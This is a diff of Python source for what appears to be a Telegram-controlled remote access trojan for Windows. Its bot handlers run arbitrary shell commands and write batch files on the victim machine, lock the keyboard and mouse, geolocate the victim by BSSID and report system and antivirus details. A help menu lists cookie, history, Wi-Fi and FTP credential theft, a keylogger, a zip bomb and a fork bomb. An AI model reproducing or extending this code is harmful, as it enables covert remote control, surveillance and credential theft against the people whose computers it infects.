 @bot.message_handler(regexp='/Freeze')
 def Freeze(command):
+
 	if Admin() is False:
 		bot.send_message(command.chat.id, '_This function requires admin rights._', parse_mode='Markdown')
 
 	if Admin() is True:
 		try:
+
 			Seconds = re.split('/Freeze ', command.text, flags=re.I)[1]
 			bot.send_message(command.chat.id, '_Keyboard and mouse locked for_ *' + Seconds + '* _seconds!_', parse_mode='Markdown')
-
 			Block(float(Seconds))
-
 			bot.reply_to(command, '_Keyboard and mouse are now unlocked!_', parse_mode='Markdown')
+
 		except ValueError:
 			bot.reply_to(command, '_Specify the duration of the lock in seconds._', parse_mode='Markdown')
+
 		except:
 			bot.send_message(command.chat.id, '_Specify the duration of the lock_\n\n*› /Freeze*', parse_mode='Markdown')
 
@@ -1091,15 +1172,17 @@ def Freeze(command):
 @bot.message_handler(regexp='/DVD')
 def DVD(command):
 	try:
+
 		DVD = re.split('/DVD ', command.text, flags=re.I)[1]
 
 		if DVD.lower() == 'Open'.lower():
 			OpenCD()
-			bot.reply_to(command, '_CD-ROM is openned!_', parse_mode='Markdown')
+			bot.reply_to(command, '_The CD-ROM has been openned!_', parse_mode='Markdown')
 
 		if DVD.lower() == 'Close'.lower():
 			CloseCD()
-			bot.reply_to(command, '_CD-ROM is closed!_', parse_mode='Markdown')
+			bot.reply_to(command, '_The CD-ROM has been closed!_', parse_mode='Markdown')
+
 	except:
 		bot.send_message(command.chat.id, 
 			'_Select CD-ROM mode_'
@@ -1117,8 +1200,10 @@ def DVD(command):
 @bot.message_handler(regexp='/CMD')
 def CMD(command):
 	try:
+
 		Command = re.split('/CMD ', command.text, flags=re.I)[1]
-		CMD = Popen(Command, shell=True, stdout=PIPE, stderr=STDOUT, stdin=PIPE)
+		CMD = subprocess.Popen(Command,
+			shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
 
 		Lines = []
 		for Line in CMD.stdout.readlines():
@@ -1128,16 +1213,19 @@ def CMD(command):
 				Output = '\n'.join(Lines)
 
 		bot.send_message(command.chat.id, Output)
+
 	except:
 		try:
-			Command = re.split('/CMD ', command.text, flags=re.I)[1]
 
+			Command = re.split('/CMD ', command.text, flags=re.I)[1]
 			SplittedText = telebot.util.split_string(Output, 4096)
 			for Output in SplittedText:
 
 				bot.send_message(command.chat.id, Output)
+
 		except UnboundLocalError:
 			bot.reply_to(command, '_Command completed!_', parse_mode='Markdown')
+
 		except:
 			bot.send_message(command.chat.id, '_Enter your command_\n\n*› /CMD*', parse_mode='Markdown')
 
@@ -1147,8 +1235,8 @@ def CMD(command):
 @bot.message_handler(regexp='/BAT')
 def BAT(command):
 	try:
-		Command = re.split('/BAT ', command.text, flags=re.I)[1]
-	
+
+		Command = re.split('/BAT ', command.text, flags=re.I)[1]	
 		File = Directory + 'Command.bat'
 		BatchFile = open(File, 'w').write(Command)
 	
@@ -1169,6 +1257,7 @@ def BAT(command):
 @bot.message_handler(regexp='/Location')
 def Location(command):
 	try:
+
 		bot.send_chat_action(command.chat.id, 'find_location')
 		Coordinates = GetLocationByBSSID(GetMacByIP())
 		Latitude = Coordinates['lat']
@@ -1181,12 +1270,13 @@ def Location(command):
 			'\n*Country* » `' + Geolocation('country') + '`' +
 			'\n*City* » `' + Geolocation('city') + '`' +
 			'\n'
-			'\n*Latitude* » `' + str(Coordinates['lat']) + '`' +
-			'\n*Longitude* » `' + str(Coordinates['lon']) + '`' +
-			'\n*Range* » `' + str(Coordinates['range']) + '`' +
+			'\n*Latitude* » `' + Coordinates['lat'] + '`' +
+			'\n*Longitude* » `' + Coordinates['lon'] + '`' +
+			'\n*Range* » `' + Coordinates['range'] + '`' +
 			'\n'
 			'\n*BSSID* » `' + GetMacByIP() + '`',
 				parse_mode='Markdown') 
+
 	except:
 		bot.send_message(command.chat.id,
 			'_Failed locate target by BSSID_'
@@ -1204,6 +1294,7 @@ def Location(command):
 @bot.message_handler(regexp='/Info')
 def Info(command):
 	try:
+
 		bot.send_chat_action(command.chat.id, 'typing')
 		bot.send_message(command.chat.id, 
 			'\n_Computer Info_'
@@ -1221,7 +1312,7 @@ def Info(command):
 			'\n*CPU* » `' + str(Computer('CPU', 'Name')) + '`' +
 			'\n*GPU* » `' + str(Computer('path Win32_VideoController', 'Name')) + '`' +
 			'\n*RAM* » `' + str(RAM()) + '`' +
-			'\n*ARM* » `' + architecture()[0] + '`' +
+			'\n*ARM* » `' + platform.architecture()[0] + '`' +
 			'\n'
 			'\n'
 			'\n_Protection_'
@@ -1230,6 +1321,7 @@ def Info(command):
 			'\n*Process Protected* » `' + str(ProcessBSODProtectionEnabled) + '`' +
 			'\n*Installed Antivirus* » `' + Antivirus[0] + '`',
 				parse_mode='Markdown')
+
 	except:
 		pass
 
@@ -1265,7 +1357,6 @@ def Help(command):
 		'\n*/Speak* - _Speak Message_'
 		'\n*/OpenURL* - _Open URL_'
 		'\n*/Wallpapers* - _Set Wallpapers_'
-		'\n*/ForkBomb* - _Launch Programs_'
 		'\n'
 		'\n*/WiFi* - _Wi-Fi Data_'
 		'\n*/FileZilla* - _FTP Client_'
@@ -1277,8 +1368,12 @@ def Help(command):
 		'\n*/Cookies* - _Get Cookies_'
 		'\n*/History* - _Get History_'
 		'\n'
+		'\n*/ZipBomb* - _Memory Overflow_'
+		'\n*/ForkBomb* - _Launch Programs_'
+		'\n'
 		'\n*/Clipboard* - _Clipboard Editing_'
 		'\n*/Keylogger* - _Receive Keylogs_'
+		'\n*/SendKeys* - _Send Key Press_'
 		'\n*/Monitor* - _Monitor Control_'
 		'\n*/Volume* - _Volume Control_'
 		'\n*/Rotate* - _Display Rotate_'
@@ -1325,12 +1420,11 @@ def CancelFiles(command):
 
 @bot.message_handler(commands=['Wallpapers', 'wallpapers'])
 def Wallpapers(command):
-	bot.send_message(command.chat.id, '_Send the photo you would like to set on the wallpapers_', parse_mode='Markdown')
+	bot.send_message(command.chat.id, '_Send photo which you would like to set on the Wallpapers_', parse_mode='Markdown')
 
 
 try:
-	bot.polling()
+	bot.polling(none_stop=True)
 except:
-	UnsetProtection()
 	os.startfile(CurrentPath)
 	sys.exit()
